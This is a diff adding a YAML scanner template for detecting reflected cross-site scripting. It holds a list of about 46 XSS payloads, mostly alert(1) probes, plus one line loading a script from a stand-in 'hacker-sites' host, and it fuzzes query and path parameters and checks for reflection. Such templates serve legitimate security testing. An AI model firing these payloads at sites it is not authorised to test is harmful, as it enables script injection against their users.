@@ -1,0 +1,92 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>"
+        - "<iframe src=\\\"javascript:alert(1);\\\" onload=javascript:alert(1)>"
+        - "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>"
+        - "<script>alert(1)</script><option"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink:href\"><image href=\"data:image/png;base64,iVBORw0KCjxvcmVWYWx1ZSUyRk1IcHViPTk+CiA8ZW5hbWF0bTE+c2QyNTU4MzU6YTY3ZTk5LTI0MWYtNDNlMS9mZWdpdzpjaGFyc2hvbWxhcGx0Xy94bXAtdHlwZXVyb3NwYWJiYW5raXgwCjxiPThpdGVudD4KICAgPHRpdGxlPlQ+CiAgaD4kYXRoIHRyZWY9JmF2Y19sZXZ0cyc+Jmxhbmc9XnN1Yw==\"></svg>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<script>alert(1)</script>"
+        - "<col id=x tabindex=1 onfocusin=alert(1)></col>"
+        - "<svg><foreignObject onload=alert(1)>"
+        - "<svg/onload=\"javascript:alert(1);\">"
+        - "&lt;SCRIPT SRC=&quot;http://hacker-sites/&lt;/SCRIPT&gt;&quot;&gt;"
+        - "<div draggable=\"true\" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>"
+        - "<script>alert(1)</script><iframe id=x"
+        - "<style>@keyframes x{}</style><object style=\"animation-name:x\" onanimationstart=\"alert(1)\"></object>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>"
+        - "<style>@keyframes slidein {}</style><input style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></input>"
+        - "<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>"
+        - "<style>@keyframes slidein {}</style><bdo style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bdo>"
+        - "&lt;STYLE&gt;background-image:\\0027url(&#1;javascript:alert(1))&apos;&gt;\\n"
+        - "<style>:target {color: red;}</style><bdi id=x style=\"transition:color 1s\" ontransitionrun=alert(1)></bdi>"
+        - "<svg/onload='javascript:alert(1)'>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><svg draggable=alert(1) ondrop=alert(1) contenteditable>drop here</svg></contenteditable>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>"
+        - "<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>"
+        - "<iframe onload=alert(1)"
+        - "<frame draggable=\"true\" ondragenter=\"alert(1)\">test</frame>"
+        - "<embed src=\\\"javascript:alert(1)\\\" id=x></embed>"
+        - "<video id=x tabindex=1 onbeforeactivate=alert(1)></video><input autofocus>"
+        - "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></a>"
+        - "<embed type=image/uri \"data:,&#10;&#15;&#14;<script>alert('XSS')</script>&#11;&#13;&#12;&nbsp;&#9;"
+        - "<track id=x tabindex=1 onfocusin=alert(1)></track><input autofocus>"
+        - "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>"
+        - "<style>:target {transform: rotate(180deg);}</style><th id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></th>"
+        - "<map onmouseenter=\"alert(1)\">test</map>"
+        - "<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr><input autofocus>"
+        - "<svg/onerror=javascript:alert(1)>"
+        - "<style>@keyframes slidein {}</style><fieldset style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></fieldset>"
+        - "<script>alert('XSS')</script>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<script>alert(1)</script>"
+        - "<svg><template onloadend=alert(1)>"
+        - "<p draggable=\"true\" ondragend=\"alert(1)\">test</p>"
+        - "<html onkeypress=\"alert(1)\" contenteditable>test</html>"
+        - "&lt;A HREF=\"javas\\x02cript:alert(1)\"&gt;XSS&lt;/A&gt;"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
